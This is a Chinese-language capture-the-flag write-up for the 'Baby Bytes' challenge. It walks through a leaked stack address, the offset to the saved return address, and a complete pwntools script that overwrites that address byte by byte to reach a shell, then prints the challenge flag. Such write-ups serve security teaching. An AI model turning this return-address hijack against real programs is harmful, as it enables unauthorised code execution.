# Baby Bytes

## 题目简述

程序提供任意单字节读和任意单字节写两个菜单功能，并主动泄露栈上局部变量 `choice` 与 `win` 函数的地址。`win` 直接执行 `/bin/sh`。程序循环退出后会从 `main` 返回，因此只需根据泄露的栈地址定位保存的返回地址，再逐字节将其改成 `win`。

## 解题过程

二进制以 `-no-pie` 编译，`win` 地址固定；栈地址则通过下面的输出直接泄露：

```c
printf("Here's your address of choice (pun intended): %p\n", &choice);
printf("You need to call the function at this address to win: %p\n", win);
```

官方构建中，保存的返回地址位于 `&choice + 0x1c`。菜单 2 接收目标地址与一个十六进制字节，随后执行 `*ptr = changeto`。虽然它还调用了没有页对齐的 `mprotect`，但目标栈页本来就可写，调用失败不影响字节写原语。

用 pwntools 逐字节写入完整的 `p64(elf.sym.win)`，再提交非法菜单项让循环结束：

```python
from pwn import ELF, context, p64, process

elf = context.binary = ELF("./baby_bytes", checksec=False)
io = process(elf.path)

io.recvuntil(b"pun intended): ")
choice_addr = int(io.recvline().strip(), 16)
saved_rip = choice_addr + 0x1C

for offset, value in enumerate(p64(elf.sym.win)):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"in hex:\n", hex(saved_rip + offset).encode())
    io.sendlineafter(b"change it to:\n", f"{value:02x}".encode())

io.sendlineafter(b"> ", b"0")
io.sendline(b"cat flag.txt")
io.interactive()
```

`main` 执行 `ret` 时从已覆盖的栈槽取出 `win` 地址，进入 shell。读取 flag 得到：

```text
grey{d1D_y0u_3njoY_youR_b4bY_B1tes?}
```

## 方法总结

- 核心技巧：把任意单字节写组合成多字节指针覆盖，劫持函数返回地址。
- 识别信号：栈地址泄露、固定代码地址、可重复字节写和显式 `win` 函数共同构成最直接的 ret2win 条件。
- 复用要点：保存返回地址相对局部变量的偏移必须针对题目构建确认；使用 `p64(elf.sym.win)` 比手写若干低位字节更稳妥。
